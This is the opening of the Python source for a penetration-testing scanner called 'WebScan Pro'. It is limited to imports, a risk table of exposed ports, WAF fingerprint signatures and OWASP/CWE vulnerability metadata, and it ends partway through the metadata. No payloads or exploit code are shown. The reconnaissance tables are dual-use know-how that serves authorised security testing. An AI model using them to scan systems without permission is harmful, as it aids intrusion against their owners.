#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# WebScan Pro v11.2 — Professional Penetration Testing Scanner

import sys, os, re, time, socket, ssl, json, datetime, argparse, hashlib, hmac, subprocess
import urllib3, requests, threading
from urllib.parse import urlparse, urljoin, quote, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
import base64 as _b64

try:
    from bs4 import BeautifulSoup
    BS4 = True
except ImportError:
    BS4 = False

try:
    from colorama import Fore, Back, Style, init as cinit
    cinit(autoreset=True)
except ImportError:
    class Fore:
        RED=GREEN=YELLOW=CYAN=MAGENTA=BLUE=WHITE=""
        LIGHTRED_EX=LIGHTGREEN_EX=LIGHTYELLOW_EX=LIGHTCYAN_EX=LIGHTMAGENTA_EX=""
    class Style:
        RESET_ALL=BRIGHT=DIM=""

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

VERSION    = "11.7"
TOOL_NAME  = "WebScan Pro"
UA         = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
TIMEOUT    = 7
THREADS    = 50
RATE       = 0.0
LOG        = []
FINDINGS   = defaultdict(list)
_lock      = threading.Lock()
_last_req  = [0.0]
START_TIME = time.time()

# ─── Verbosity / Checkpoint globals ───────────────────────────────
VERBOSE         = False
QUIET           = False
CHECKPOINT_FILE = ""
SCAN_STATE      = {"completed_modules": []}

# ─── v11.0: Scope filter + Rate limit globals ──────────────────────
SCAN_SCOPE  = set()   # empty = run all; populated from --scope flag
RATE_DELAY  = 0.0     # seconds between requests (0 = unlimited)

# ─── v9.0 expanded port list (150+) ──────────────────────────────
PORTS_TOP = [
    20,21,22,23,25,43,53,67,68,69,70,79,80,81,88,102,110,111,
    113,119,123,135,137,138,139,143,161,162,179,194,220,
    389,443,445,465,500,502,512,513,514,515,
    520,543,544,546,547,548,554,563,587,
    631,636,666,993,995,
    1080,1194,1433,1434,1521,1723,1900,
    2049,2082,2083,2086,2087,2095,2096,2181,2375,2376,
    3000,3268,3269,3306,3389,3690,4000,4369,4444,4848,
    5000,5001,5432,5555,5900,5985,5986,6379,6443,6666,
    7001,7002,7474,7547,
    8000,8008,8009,8080,8081,8082,8083,8088,8161,8443,8444,
    8500,8800,8888,8983,9000,9001,9042,9090,9092,9200,9300,
    9418,9999,10000,10250,10255,11211,15672,27017,27018,28017,
    47001,49152,50000,50070,61616,
]

PORT_RISK = {
    20:  ("FTP-Data",     "Medium",  "FTP data transfer port"),
    21:  ("FTP",          "Medium",  "Plaintext file transfer — credentials exposed"),
    22:  ("SSH",          "Info",    "Secure shell — check for weak passwords/old keys"),
    23:  ("Telnet",       "Critical","Plaintext protocol — all data visible on network"),
    25:  ("SMTP",         "Medium",  "Mail server — check for open relay"),
    43:  ("WHOIS",        "Low",     "WHOIS service — may reveal internal info"),
    53:  ("DNS",          "Low",     "DNS server — check for zone transfer"),
    69:  ("TFTP",         "High",    "Trivial FTP — no authentication"),
    79:  ("Finger",       "Medium",  "Finger service — user enumeration risk"),
    80:  ("HTTP",         "Low",     "Unencrypted web traffic"),
    102: ("Siemens S7",   "Critical","Industrial control system port — SCADA risk"),
    135: ("RPC",          "High",    "Windows RPC — wormable in some configurations"),
    137: ("NetBIOS-NS",   "High",    "NetBIOS name service — info disclosure"),
    138: ("NetBIOS-DGM",  "High",    "NetBIOS datagram — info disclosure"),
    139: ("NetBIOS",      "High",    "NetBIOS — information disclosure risk"),
    161: ("SNMP",         "High",    "SNMP — may expose system info with default community strings"),
    162: ("SNMP-Trap",    "Medium",  "SNMP trap receiver"),
    389: ("LDAP",         "High",    "LDAP — may allow anonymous query of directory"),
    443: ("HTTPS",        "Info",    "Encrypted web traffic"),
    445: ("SMB",          "Critical","SMB — EternalBlue/WannaCry exploit risk"),
    465: ("SMTPS",        "Low",     "Encrypted SMTP"),
    500: ("IKE",          "Medium",  "VPN IKE — potential VPN attack surface"),
    502: ("Modbus",       "Critical","Industrial Modbus — ICS/SCADA protocol"),
    587: ("SMTP-Submit",  "Low",     "Mail submission"),
    636: ("LDAPS",        "Medium",  "LDAP over SSL"),
    993: ("IMAPS",        "Info",    "Encrypted IMAP"),
    995: ("POP3S",        "Info",    "Encrypted POP3"),
    1080:("SOCKS",        "High",    "SOCKS proxy — may be used to pivot"),
    1194:("OpenVPN",      "Medium",  "OpenVPN service"),
    1433:("MSSQL",        "High",    "SQL Server — check for default credentials"),
    1434:("MSSQL-UDP",    "High",    "SQL Server UDP — may reveal version info"),
    1521:("Oracle DB",    "High",    "Oracle DB — check for default credentials"),
    1723:("PPTP",         "Medium",  "PPTP VPN — known weak encryption"),
    1900:("SSDP/UPnP",    "High",    "UPnP — often exposes internal services"),
    2049:("NFS",          "High",    "NFS — may allow unauthorized file access"),
    2181:("ZooKeeper",    "High",    "ZooKeeper — no auth, full cluster control"),
    2375:("Docker",       "Critical","Docker daemon — unauthenticated API, RCE possible"),
    2376:("Docker-TLS",   "High",    "Docker daemon TLS — check cert validation"),
    3000:("Dev Server",   "Medium",  "Development server — may expose debug info"),
    3268:("LDAP-GC",      "High",    "LDAP Global Catalog — AD info exposure"),
    3306:("MySQL",        "High",    "MySQL — check for default credentials"),
    3389:("RDP",          "High",    "Remote Desktop — brute-force risk"),
    3690:("SVN",          "Medium",  "Subversion — may expose source code"),
    4369:("EPMD",         "High",    "Erlang Port Mapper — RabbitMQ/Erlang exposure"),
    4444:("Meterpreter",  "Critical","Likely backdoor/Meterpreter shell!"),
    4848:("GlassFish",    "High",    "GlassFish admin console — default creds risk"),
    5000:("Dev/UPnP",     "Medium",  "Dev server or UPnP"),
    5432:("PostgreSQL",   "High",    "PostgreSQL — check for default credentials"),
    5555:("ADB",          "Critical","Android Debug Bridge — full device control"),
    5900:("VNC",          "High",    "VNC — often no password"),
    5985:("WinRM-HTTP",   "High",    "Windows Remote Management HTTP"),
    5986:("WinRM-HTTPS",  "High",    "Windows Remote Management HTTPS"),
    6379:("Redis",        "Critical","Redis — no auth by default, RCE possible"),
    6443:("K8s-API",      "Critical","Kubernetes API server — cluster takeover risk"),
    7001:("WebLogic",     "Critical","WebLogic — multiple RCE CVEs"),
    7002:("WebLogic-TLS", "High",    "WebLogic TLS admin port"),
    7474:("Neo4j",        "High",    "Neo4j graph DB — no auth by default"),
    7547:("CWMP",         "High",    "TR-069 CWMP — ISP router management, exploitable"),
    8009:("AJP",          "Critical","Apache AJP — Ghostcat vulnerability (CVE-2020-1938)"),
    8080:("HTTP-Alt",     "Low",     "Alternative HTTP port"),
    8161:("ActiveMQ",     "High",    "ActiveMQ admin — default creds admin/admin"),
    8443:("HTTPS-Alt",    "Low",     "Alternative HTTPS port"),
    8888:("Jupyter",      "Critical","Jupyter Notebook — often no auth, RCE via notebooks"),
    8983:("Solr",         "High",    "Apache Solr — data exposure and RCE risk"),
    9000:("SonarQube",    "Medium",  "SonarQube or PHP-FPM"),
    9042:("Cassandra",    "High",    "Cassandra DB — no auth by default"),
    9092:("Kafka",        "High",    "Apache Kafka — no auth, message interception"),
    9200:("Elasticsearch","Critical","Elasticsearch — no auth, data exposure"),
    9300:("Elasticsearch","High",    "Elasticsearch node communication"),
    10000:("Webmin",      "High",    "Webmin admin — CVE history, brute-force risk"),
    10250:("Kubelet",     "Critical","Kubernetes Kubelet API — container RCE"),
    10255:("Kubelet-RO",  "High",    "Kubernetes Kubelet read-only API"),
    11211:("Memcached",   "Critical","Memcached — no auth, amplification DDoS"),
    15672:("RabbitMQ",    "High",    "RabbitMQ management UI — default guest/guest"),
    27017:("MongoDB",     "Critical","MongoDB — no auth by default, data exposure"),
    27018:("MongoDB",     "High",    "MongoDB shard server"),
    28017:("MongoDB-Web", "High",    "MongoDB web status interface"),
    47001:("WinRM",       "High",    "Windows Remote Management"),
    50000:("SAP",         "High",    "SAP ICM — check for default credentials"),
    50070:("Hadoop",      "High",    "Hadoop NameNode — data exposure"),
    61616:("ActiveMQ",    "High",    "ActiveMQ broker — exploitable, default creds"),
}

# ─── v9.0 expanded WAF signatures (30+) ──────────────────────────
WAF_SIGS_GLOBAL = {
    "Cloudflare":      ["cloudflare","cf-ray","__cfduid","cf-cache-status","cloudflare-nginx"],
    "AWS WAF":         ["awselb","x-amzn-requestid","aws-waf","x-amzn-trace-id"],
    "Akamai":          ["akamai","akamai-ghost","x-akamai","x-check-cacheable"],
    "Sucuri":          ["sucuri","x-sucuri-id","x-sucuri-cache","x-sucuri-block"],
    "ModSecurity":     ["mod_security","modsecurity","NOYB","x-modsecurity"],
    "Imperva Incapsula":["imperva","incapsula","visid_incap","incap_ses"],
    "F5 BIG-IP":       ["f5-bigip","bigipserver","x-cnection","x-wa-info"],
    "Barracuda":       ["barracuda","barra_counter_session","barracudawaf"],
    "Wordfence":       ["wordfence","wfvt_","wordfence_verifiedhuman"],
    "Nginx WAF/NAXSI": ["x-nginx-waf","naxsi","x-naxsi-sig"],
    "Fortinet FortiWeb":["fortiwafsid","x-fw-debug"],
    "Citrix NetScaler": ["ns_af","citrix_ns_id","nf_"],
    "DenyAll rWeb":     ["sessioncookie","x-denyall"],
    "Distil Networks":  ["x-distil-cs","distil_RID"],
    "Dyn Web App Firewall":["x-dyn-waf"],
    "EdgeCast WAF":     ["x-ec-custom-error"],
    "Fastly WAF":       ["x-fastly-request-id","fastly-restarts"],
    "Palo Alto":        ["x-pan-waf"],
    "Radware AppWall":  ["x-sl-compstate","rdwr"],
    "SiteLock TrueShield":["x-sitelock-","sitelock-"],
    "StackPath WAF":    ["x-sp-waf","stackpath"],
    "Varnish":          ["x-varnish","via: 1.1 varnish","x-cache: hit"],
    "Wallarm":          ["x-wallarm-node","wallarm"],
    "Alibaba Cloud Shield":["ali-cdn","x-swift","x-nws-log-uuid"],
    "Tencent Cloud WAF":["x-safe-tencent","tencentwaf"],
    "Yundun WAF":       ["yundun","yunsuo"],
    "Comodo WAF":       ["protected_by_comodo","comodo"],
    "BitNinja":         ["x-bitninja","bitninja"],
    "Reblaze":          ["x-reblaze-protection"],
    "Azure Front Door": ["x-azure-ref","x-fd-healthprobe","x-ms-ref"],
    "Zscaler":          ["zscaler","zscloud"],
}

SEV_COLOR = {
    "Critical": Fore.RED + Style.BRIGHT,
    "High":     Fore.LIGHTRED_EX,
    "Medium":   Fore.YELLOW,
    "Low":      Fore.LIGHTCYAN_EX,
    "Info":     Fore.CYAN,
}
SEV_ICON  = {"Critical":"💀","High":"🔴","Medium":"🟡","Low":"🔵","Info":"⚪"}
SEV_SCORE = {"Critical":10,"High":7,"Medium":4,"Low":2,"Info":0}

# ─── OWASP / CWE / CVSS / Business-Impact reference per category ──
CAT_META = {
    "sqli":{"owasp":"A03:2021","owasp_name":"Injection","cwe":"CWE-89","cvss":9.8,
        "biz": "An attacker can read, modify, or delete your ENTIRE database including user accounts, passwords, and payment records. This is the most dangerous web vulnerability.","wstg": "WSTG-INPV-05","asvs": "ASVS-5.3.4"},
    "xss":{"owasp":"A03:2021","owasp_name":"Injection","cwe":"CWE-79","cvss":6.1,
        "biz": "An attacker can hijack user sessions, steal login cookies, redirect users to phishing pages, and perform actions on behalf of logged-in users.","wstg": "WSTG-CLNT-01","asvs": "ASVS-5.3.3"},
    "lfi":{"owasp":"A01:2021","owasp_name":"Broken Access Control","cwe":"CWE-22","cvss":8.1,
        "biz": "An attacker can read sensitive server files: /etc/passwd, SSH private keys, database credentials in config files, and application source code.","wstg": "WSTG-ATHZ-01","asvs": "ASVS-5.3.12"},
    "ssrf":{"owasp":"A10:2021","owasp_name":"Server-Side Request Forgery","cwe":"CWE-918","cvss":8.8,
        "biz": "An attacker can use your server to scan internal networks, steal AWS/GCP cloud credentials via metadata API, and reach internal services not meant to be public.","wstg": "WSTG-INPV-19","asvs": "ASVS-5.3.17"},
    "xxe":{"owasp":"A04:2021","owasp_name":"Insecure Design","cwe":"CWE-611","cvss":7.5,
        "biz": "An attacker can read sensitive files from the server or cause denial of service through XML entity expansion (Billion Laughs attack).","wstg": "WSTG-INPV-07","asvs": "ASVS-5.5.2"},
    "cors":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-942","cvss":6.5,
        "biz": "Malicious websites can make authenticated API requests on behalf of your logged-in users and steal their sensitive data or perform actions without consent.","wstg": "WSTG-CLNT-07","asvs": "ASVS-14.5.3"},
    "csrf":{"owasp":"A01:2021","owasp_name":"Broken Access Control","cwe":"CWE-352","cvss":6.5,
        "biz": "An attacker can trick logged-in users into changing passwords, making purchases, transferring funds, or deleting account data without the user knowing.","wstg": "WSTG-SESS-05","asvs": "ASVS-4.2.2"},
    "redirect":{"owasp":"A01:2021","owasp_name":"Broken Access Control","cwe":"CWE-601","cvss":5.4,
        "biz": "Users can be redirected from your trusted domain to malicious phishing sites, damaging brand trust and enabling credential theft at scale.","wstg": "WSTG-CLNT-04","asvs": "ASVS-5.1.5"},
    "headers":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-693","cvss":5.3,
        "biz": "Missing security headers allow browser-based attacks like clickjacking, MIME-type confusion, and XSS to succeed even if application code is otherwise secure.","wstg": "WSTG-CONF-07","asvs": "ASVS-14.4.1"},
    "cookies":{"owasp":"A02:2021","owasp_name":"Cryptographic Failures","cwe":"CWE-614","cvss":5.9,
        "biz": "Session cookies without proper security flags can be stolen via network interception or malicious JavaScript injection, leading to account takeover.","wstg": "WSTG-SESS-02","asvs": "ASVS-3.4.1"},
    "ssl":{"owasp":"A02:2021","owasp_name":"Cryptographic Failures","cwe":"CWE-295","cvss":5.9,
        "biz": "Without valid HTTPS, all traffic between users and the server is unencrypted. Attackers on the same network can read passwords, payment data, and private messages.","wstg": "WSTG-CRYP-01","asvs": "ASVS-9.1.1"},
    "sensitive":{"owasp":"A01:2021","owasp_name":"Broken Access Control","cwe":"CWE-538","cvss":7.5,
        "biz": "Exposed backup or configuration files can reveal database credentials, API keys, and application source code to any visitor — no technical skill required.","wstg": "WSTG-CONF-10","asvs": "ASVS-8.3.4"},
    "methods":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-650","cvss":5.3,
        "biz": "Dangerous HTTP methods like PUT and DELETE allow attackers to upload malicious files or delete web content without any authentication.","wstg": "WSTG-CONF-06","asvs": "ASVS-14.5.1"},
    "privesc":{"owasp":"A01:2021","owasp_name":"Broken Access Control","cwe":"CWE-284","cvss":8.1,
        "biz": "Exposed admin interfaces, debug panels, or API schemas allow attackers to escalate privileges, access sensitive data, or take full control of the application.","wstg": "WSTG-ATHZ-01","asvs": "ASVS-4.1.1"},
    "ports":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-200","cvss":5.3,
        "biz": "Each exposed network service increases the attack surface. Services like MongoDB, Redis, and Elasticsearch are especially dangerous when accessible from the internet.","wstg": "WSTG-INFO-07","asvs": "ASVS-14.2.3"},
    "dirs":{"owasp":"A01:2021","owasp_name":"Broken Access Control","cwe":"CWE-548","cvss":5.3,
        "biz": "Hidden admin directories or backup folders may expose sensitive functionality, archived files with credentials, or legacy code with known vulnerabilities.","wstg": "WSTG-CONF-04","asvs": "ASVS-8.3.4"},
    "waf":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-200","cvss":0.0,
        "biz": "WAF configuration directly impacts the feasibility of automated attacks against your application.","wstg": "WSTG-CONF-07","asvs": "ASVS-14.4.1"},
    "subdomains":{"owasp":"A01:2021","owasp_name":"Broken Access Control","cwe":"CWE-200","cvss":0.0,
        "biz": "Each subdomain may host outdated applications or services with weaker security controls than the main domain.","wstg": "WSTG-INFO-04","asvs": "ASVS-14.2.3"},
    "tech":{"owasp":"A06:2021","owasp_name":"Vulnerable and Outdated Components","cwe":"CWE-200","cvss":0.0,
        "biz": "Identified technologies reveal version information that attackers use to find specific publicly known exploits (CVEs) targeting your exact stack.","wstg": "WSTG-INFO-02","asvs": "ASVS-14.2.1"},
    "ssti":{"owasp":"A03:2021","owasp_name":"Injection","cwe":"CWE-94","cvss":9.8,
        "biz": "Server-side code execution via template injection gives attackers FULL control of the server — read files, execute OS commands, pivot to internal networks, and install backdoors.","wstg": "WSTG-INPV-18","asvs": "ASVS-5.3.17"},
    "cmdi":{"owasp":"A03:2021","owasp_name":"Injection","cwe":"CWE-78","cvss":10.0,
        "biz": "An attacker can execute arbitrary operating system commands with the web server's privileges — reading /etc/passwd, stealing files, creating backdoors, and taking full server control.","wstg": "WSTG-INPV-12","asvs": "ASVS-5.3.8"},
    "jwt":{"owasp":"A02:2021","owasp_name":"Cryptographic Failures","cwe":"CWE-347","cvss":8.1,
        "biz": "Weak or misconfigured JWT tokens allow attackers to forge authentication tokens, escalate to admin, and access any user's account without knowing their password.","wstg": "WSTG-SESS-10","asvs": "ASVS-3.5.3"},
    "ratelimit":{"owasp":"A07:2021","owasp_name":"Identification and Authentication Failures","cwe":"CWE-307","cvss":7.5,
        "biz": "Without rate limiting, attackers can run automated brute-force attacks trying thousands of password combinations per minute until a valid login is found.","wstg": "WSTG-ATHN-03","asvs": "ASVS-2.2.1"},
    "authn_bypass":{"owasp":"A07:2021","owasp_name":"Identification and Authentication Failures","cwe":"CWE-287","cvss":9.8,
        "biz": "Authentication bypass gives an attacker full access to the application without valid credentials — accessing admin panels, user data, and all restricted functionality.","wstg": "WSTG-ATHN-01","asvs": "ASVS-2.1.1"},
    "graphql":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-200","cvss":5.3,
        "biz": "Exposed GraphQL introspection and unbounded queries allow attackers to map the entire API schema, discover hidden endpoints, and amplify brute-force attacks through batch queries.","wstg": "WSTG-INPV-11","asvs": "ASVS-13.1.1"},
    "post_inject":{"owasp":"A03:2021","owasp_name":"Injection","cwe":"CWE-89","cvss":9.0,
        "biz": "POST body parameters are equally vulnerable to injection as GET params. Attackers can submit malicious payloads via forms, API calls, and JSON bodies to trigger SQL injection, XSS, or command injection.","wstg": "WSTG-INPV-05","asvs": "ASVS-5.3.4"},
    "stored_xss":{"owasp":"A03:2021","owasp_name":"Injection","cwe":"CWE-79","cvss":8.0,
        "biz": "Stored XSS persists in the database and executes in every user's browser who views the page — no interaction needed from the attacker. This enables mass session hijacking, defacement, and malware distribution.","wstg": "WSTG-INPV-02","asvs": "ASVS-5.3.3"},
    "hostheader":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-20","cvss":6.1,
        "biz": "Host header injection can poison password reset emails (sending them to attacker-controlled domains), poison server-side caches, or bypass virtual host-based authentication.","wstg": "WSTG-INPV-17","asvs": "ASVS-5.3.2"},
    "crlf":{"owasp":"A03:2021","owasp_name":"Injection","cwe":"CWE-93","cvss":6.1,
        "biz": "CRLF injection allows an attacker to inject arbitrary HTTP headers or split HTTP responses — enabling cookie injection, XSS via crafted response headers, and cache poisoning.","wstg": "WSTG-INPV-15","asvs": "ASVS-5.3.2"},
    "idor":{"owasp":"A01:2021","owasp_name":"Broken Access Control","cwe":"CWE-639","cvss":8.1,
        "biz": "IDOR allows attackers to access any user's data by simply changing an ID number in a URL — exposing all user accounts, orders, messages, and sensitive records without any authentication bypass.","wstg": "WSTG-ATHZ-04","asvs": "ASVS-4.2.1"},
    "subdomain_takeover":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-116","cvss":8.1,
        "biz": "Subdomain takeover allows an attacker to serve content from your trusted domain — enabling highly credible phishing attacks, session cookie theft (if cookies scope to the domain), and brand damage.","wstg": "WSTG-CONF-10","asvs": "ASVS-14.2.3"},
    "dns_axfr":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-200","cvss":7.5,
        "biz": "DNS zone transfer exposes your complete internal infrastructure map — all hostnames, IP addresses, and service locations — dramatically reducing attacker reconnaissance time.","wstg": "WSTG-INFO-06","asvs": "ASVS-14.2.3"},
    "smuggling":{"owasp":"A02:2021","owasp_name":"Cryptographic Failures","cwe":"CWE-444","cvss":8.1,
        "biz": "HTTP request smuggling allows attackers to inject requests that appear to come from other users, bypass security controls, hijack sessions, and perform actions as other users on shared infrastructure.","wstg": "WSTG-INPV-13","asvs": "ASVS-14.5.1"},
    # Phase 2b — v10.0
    "oauth2":{"owasp":"A07:2021","owasp_name":"Identification and Authentication Failures","cwe":"CWE-287","cvss":8.8,
        "biz": "OAuth 2.0 misconfiguration allows attackers to steal authorization codes, perform CSRF attacks against the OAuth flow, or redirect tokens to attacker-controlled endpoints.","wstg": "WSTG-ATHN-06","asvs": "ASVS-2.5.5"},
    "hpp":{"owasp":"A03:2021","owasp_name":"Injection","cwe":"CWE-235","cvss":6.5,
        "biz": "HTTP Parameter Pollution can bypass WAF rules, inject malicious values into duplicate parameters, and exploit server inconsistency in parameter parsing to perform injection attacks.","wstg": "WSTG-INPV-04","asvs": "ASVS-5.1.1"},
    "cache_poison":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-345","cvss":8.1,
        "biz": "Web cache poisoning allows attackers to serve malicious content to all users who receive the poisoned cached response — enabling mass XSS, redirects, and credential theft at CDN scale.","wstg": "WSTG-CONF-07","asvs": "ASVS-14.5.2"},
    "proto_poll":{"owasp":"A03:2021","owasp_name":"Injection","cwe":"CWE-1321","cvss":8.1,
        "biz": "Prototype pollution enables attackers to inject properties into JavaScript Object prototypes — leading to property overwriting, denial of service, and potentially remote code execution in Node.js.","wstg": "WSTG-CLNT-10","asvs": "ASVS-5.3.17"},
    "deserial":{"owasp":"A08:2021","owasp_name":"Software and Data Integrity Failures","cwe":"CWE-502","cvss":9.8,
        "biz": "Insecure deserialization allows attackers to craft malicious serialized objects that execute arbitrary code when deserialized — often achieving remote code execution with server-level privileges.","wstg": "WSTG-INPV-11","asvs": "ASVS-5.5.3"},
    "api_sec":{"owasp":"A01:2021","owasp_name":"Broken Access Control","cwe":"CWE-284","cvss":8.8,
        "biz": "API mass assignment and BOLA (Broken Object Level Authorization) allow attackers to escalate privileges by assigning admin roles, access any object by ID, and modify other users' data.","wstg": "WSTG-ATHZ-01","asvs": "ASVS-4.2.1"},
    "biz_logic":{"owasp":"A04:2021","owasp_name":"Insecure Design","cwe":"CWE-840","cvss":7.5,
        "biz": "Business logic flaws allow attackers to manipulate prices, bypass purchase flows, exploit negative quantities, and perform actions the application logic was not designed to allow.","wstg": "WSTG-BUSL-01","asvs": "ASVS-15.1.1"},
    # Phase 2c — v11.0
    "websocket":{"owasp":"A07:2021","owasp_name":"Identification and Authentication Failures","cwe":"CWE-345","cvss":7.5,
        "biz": "WebSocket security flaws allow attackers to hijack authenticated WebSocket sessions via Cross-Site WebSocket Hijacking (CSWSH) or access unencrypted ws:// connections for data interception.","wstg": "WSTG-CLNT-10","asvs": "ASVS-13.5.1"},
    "saml":{"owasp":"A07:2021","owasp_name":"Identification and Authentication Failures","cwe":"CWE-287","cvss":9.1,
        "biz": "SAML misconfiguration allows attackers to bypass authentication entirely via XML signature wrapping or XXE injection in SAML assertions — gaining admin access without valid credentials.","wstg": "WSTG-ATHN-06","asvs": "ASVS-2.5.5"},
    "otp_bypass":{"owasp":"A07:2021","owasp_name":"Identification and Authentication Failures","cwe":"CWE-307","cvss":8.8,
        "biz": "2FA/OTP bypass vulnerabilities allow attackers to brute-force 6-digit OTP codes, reuse previously valid codes, or manipulate response values — completely defeating two-factor authentication.","wstg": "WSTG-ATHN-06","asvs": "ASVS-2.8.1"},
    "path_norm":{"owasp":"A01:2021","owasp_name":"Broken Access Control","cwe":"CWE-22","cvss":7.5,
        "biz": "Path normalization bypass allows attackers to access admin-only or blocked endpoints by using URL encoding, double slashes, or Unicode to confuse the security layer.","wstg": "WSTG-ATHZ-01","asvs": "ASVS-5.3.12"},
    "email_inject":{"owasp":"A03:2021","owasp_name":"Injection","cwe":"CWE-93","cvss":6.5,
        "biz": "Email header injection allows attackers to add CC/BCC recipients to your contact forms — using your mail server as a spam relay and potentially impersonating your domain.","wstg": "WSTG-INPV-10","asvs": "ASVS-5.3.2"},
    "dep_confusion":{"owasp":"A06:2021","owasp_name":"Vulnerable and Outdated Components","cwe":"CWE-427","cvss":7.5,
        "biz": "Dependency confusion allows attackers to publish malicious packages with the same name as your internal packages — which may be automatically installed instead of your private ones during CI/CD builds.","wstg": "WSTG-CONF-10","asvs": "ASVS-14.2.1"},
    "dom_xss":{"owasp":"A03:2021","owasp_name":"Injection","cwe":"CWE-79","cvss":7.5,
        "biz": "DOM-based XSS occurs entirely in the browser — the payload never touches the server. Attackers use URL fragments, postMessage, or other browser APIs to inject malicious scripts that steal sessions and data.","wstg": "WSTG-CLNT-01","asvs": "ASVS-5.3.3"},
    "ip_info":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-200","cvss":0.0,
        "biz": "IP and geolocation information reveals hosting infrastructure details useful in targeted attacks.","wstg": "WSTG-INFO-07","asvs": "ASVS-14.2.3"},
    # Phase 1 OSINT — v11.3
    "osint_email":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-200","cvss":5.3,
        "biz": "Exposed email addresses enable targeted phishing, credential stuffing, and social engineering attacks against staff and administrators.","wstg": "WSTG-INFO-01","asvs": "ASVS-8.3.4"},
    "osint_dns":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-16","cvss":7.5,
        "biz": "Missing DMARC/SPF/DKIM records allow attackers to send spoofed emails from your domain — enabling highly credible phishing campaigns that bypass spam filters.","wstg": "WSTG-INFO-06","asvs": "ASVS-9.1.4"},
    "osint_dorks":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-200","cvss":0.0,
        "biz": "Google dorks reveal files, login panels, error pages, and sensitive paths indexed by search engines and accessible to any attacker without authentication.","wstg": "WSTG-INFO-01","asvs": "ASVS-8.3.4"},
    "osint_breach":{"owasp":"A07:2021","owasp_name":"Identification and Authentication Failures","cwe":"CWE-359","cvss":8.1,
        "biz": "Previously breached credentials may still be in active use. Attackers use breach databases to perform credential stuffing against your login endpoints.","wstg": "WSTG-ATHN-07","asvs": "ASVS-2.1.5"},
    "osint_github":{"owasp":"A02:2021","owasp_name":"Cryptographic Failures","cwe":"CWE-312","cvss":9.0,
        "biz": "Hardcoded API keys, passwords, and tokens in public repositories give attackers direct access to cloud infrastructure, databases, and third-party services without any hacking required.","wstg": "WSTG-CONF-10","asvs": "ASVS-14.2.1"},
    "osint_js":{"owasp":"A02:2021","owasp_name":"Cryptographic Failures","cwe":"CWE-312","cvss":7.5,
        "biz": "JavaScript files often contain hardcoded API keys, internal endpoint URLs, and authentication tokens that are visible to anyone who views your page source.","wstg": "WSTG-INFO-05","asvs": "ASVS-8.3.4"},
    "default_creds":{"owasp":"A07:2021","owasp_name":"Identification and Authentication Failures","cwe":"CWE-521","cvss":9.8,
        "biz": "Default or weak credentials on admin panels give attackers immediate full access to the application, server, and database without any exploitation required.","wstg": "WSTG-ATHN-07","asvs": "ASVS-2.1.5"},
    "srv_hardening":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-16","cvss":7.5,
        "biz": "Exposed server internals, CGI vulnerabilities, WebDAV, and backup files allow attackers to enumerate technology stack, upload files, or execute remote commands.","wstg": "WSTG-CONF-02","asvs": "ASVS-14.2.2"},
    "info_disclosure":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-200","cvss":5.3,
        "biz": "Internal IP addresses, stack traces, debug output, and sensitive comments in HTML reduce attacker effort significantly by revealing internal architecture and credentials.","wstg": "WSTG-INFO-05","asvs": "ASVS-8.3.4"},
    "zap_passive":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-16","cvss":4.3,
        "biz": "Insecure form actions, missing cache headers, autocomplete on passwords, and mixed content create attack surfaces for credential theft, cache poisoning, and downgrade attacks.","wstg": "WSTG-CONF-07","asvs": "ASVS-14.4.1"},
    "cloud_bucket":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-312","cvss":7.5,"wstg":"WSTG-CONF-10","asvs":"V14.4","biz":"Cloud storage misconfiguration exposing sensitive files or allowing public write access"},
"mass_assignment":{"owasp":"A08:2021","owasp_name":"Software and Data Integrity Failures","cwe":"CWE-915","cvss":7.5,"wstg":"WSTG-BUSL-08","asvs":"V13.3","biz":"Mass assignment allows attackers to set unauthorized model attributes"},
"acct_takeover":{"owasp":"A07:2021","owasp_name":"Identification and Authentication Failures","cwe":"CWE-284","cvss":9.1,"wstg":"WSTG-ATHN-06","asvs":"V2.9","biz":"Account takeover exposes user data and enables impersonation or fraud"},
"redos":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-1333","cvss":5.3,"wstg":"WSTG-BUSL-09","asvs":"V12.3","biz":"ReDoS causes denial of service via catastrophic regex backtracking"},
"clickjacking":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-1021","cvss":4.3,"wstg":"WSTG-CLNT-09","asvs":"V14.4","biz":"Clickjacking tricks users into unintended actions via hidden iframe overlays"},
"jsonp_inject":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-345","cvss":6.5,"wstg":"WSTG-CLNT-11","asvs":"V13.2","biz":"JSONP injection enables cross-origin data theft without CORS restrictions"},
"css_inject":{"owasp":"A03:2021","owasp_name":"Injection","cwe":"CWE-74","cvss":5.4,"wstg":"WSTG-CLNT-05","asvs":"V5.3","biz":"CSS injection enables data exfiltration or UI manipulation via style attributes"},
"http2_vulns":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-770","cvss":7.5,"wstg":"WSTG-CONF-12","asvs":"V14.1","biz":"HTTP/2 vulnerabilities enable header injection, DoS or request smuggling attacks"},
